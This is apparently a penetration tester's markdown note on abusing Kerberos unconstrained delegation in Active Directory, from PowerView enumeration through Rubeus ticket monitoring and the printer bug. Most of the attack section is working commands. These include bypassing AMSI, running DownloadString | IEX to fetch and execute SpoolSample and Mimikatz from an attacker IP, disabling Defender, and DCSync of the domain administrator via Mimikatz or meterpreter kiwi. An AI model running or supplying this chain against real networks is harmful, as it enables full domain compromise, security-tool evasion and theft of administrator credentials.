# Unconstrained Delegation

## What it is

Ref: (https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/)

- Happens in the cases where there is a frontend service host (Host A) and a backend service host (Host B)
- When a user wants to access a service, a TGS specific to that service and that user is issued by the KDC
- But the user cant use the TGS for the frontend service to authenticate to the backend service
- To solve this problem, the frontend service is configured for unconstrained delegation which designates Host A as a host that can forward TGS and authenticate on behalf of the user to ANY SERVICE
- Typically, services may be misconfigured with this so worth checking!

## How to check if we can do this

1) Via Bloodhound (CoerceToTGT)
2) Via Powerview (Any non-DC host with the TRUSTED_FOR_DELEGATION in its UAC attribute)
```powershell
Get-DomainComputer -Unconstrained -Properties useraccountcontrol.dnshostname | format-list
```

## Exploiting it

1) After identifying the host, gain local admin access on that host
2) Using meterpreter or potatos or print spooler, elevate yourself to NT Authority/SYSTEM
3) open Administrator cmd prompt and execute Rubeus in monitoring mode
```powershell
.\Rubeus.exe monitor /interval:5 /nowrap
```
4) Use any domain credential that you have to log in to a host and trigger the printer bug through the following:

a) Via SpoolSample.exe


b) Via Invoke-Spoolsample

- Grab the script from here (https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)

- Use the Custom Runspace to bypass AMSI, download the script in memory from your apache2 server, and then execute it with the following commands (within the runspace)

First Arg to -Command is the DC hostname, Second Arg is the hostname of where your Rubeus is being run on (the unconstrained delegation host)

```csharp
String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/spoolsample.txt') | IEX; Invoke-SpoolSample -Command 'dc03.infinity.com web05.infinity.com'"; 
```



5) Load the DC machine account ticket into your current domain user; and attempt to DCSync. Prior to loading mimikatz, you may need to find someway to disable defender. This can be done via a LOCAL high priv account (For example from LAPS) and disable the defender via another shell.

```csharp
// Watch the quotation marks! Problematic and hard to get this to work. Don't use this until I can figure this out!
String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/mimikatz.txt') | IEX; Invoke-Mimikatz -Command "`"lsadump::dcsync /domain:infinity.com /user:infinity\\administrator`""";
```

Instead use the interactive C# code in the AppLocker.md to run Invoke-Mimikatz.
However there is some weird shit and the command must be run like this (note the single quotation followed by double quotation)

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:pete"'
```



*ALTERNATIVE WAY*

- Since you have a meterpreter session, you can make use of kiwi!

```bash
meterpreter > load kiwi
# dcsync followed by the account you want to target
meterpreter > dcsync administrator 

```